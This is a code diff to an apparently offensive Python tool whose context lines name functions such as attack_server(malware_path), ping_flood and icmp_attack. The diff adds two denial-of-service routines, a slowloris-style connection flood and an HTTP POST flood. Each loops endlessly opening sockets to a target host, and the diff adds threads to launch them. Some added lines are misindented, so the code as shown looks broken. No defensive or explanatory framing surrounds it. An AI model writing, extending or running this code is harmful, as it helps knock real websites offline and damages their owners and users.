@@ -42,10 +42,10 @@ def attack_server(malware_path):
 
     headers = {'Content-Type': 'application/x-www-form-urlencoded'}  
 
-    
+
     response = requests.post(url, data=payload, headers=headers)
 
-    
+
 
     if response.status_code == 200:
 
@@ -645,6 +645,28 @@ def icmp_attack(target_ip):
         sock.sendto(packet, (target_ip, 0))
 
 
+def slowloris_attack():
+    while True:
+        try:
+            target_ip = socket.gethostbyname(target_url)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target_ip, target_port))
+            s.sendall(generate_payload().encode())
+        except:
+            pass
+
+
+def http_post_flood():
+    while True:
+        try:
+            target_ip = socket.gethostbyname(target_url)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target_ip, target_port))
+            s.sendall(f"POST / HTTP/1.1\r\nHost: {target_url}\r\n\r\n".encode())
+        except:
+            pass
+
+
 def check_website_status():
 
     while True:
@@ -733,6 +755,10 @@ if __name__ == "__main__":
     threading.Thread(target=ping_flood, args=(target_ip,)).start()
 
     threading.Thread(target=icmp_attack, args=(target_ip,)).start()
+
+threading.Thread(target=slowloris_attack).start()
+
+threading.Thread(target=http_post_flood).start()
 
     threading.Thread(target=check_website_status).start()
 
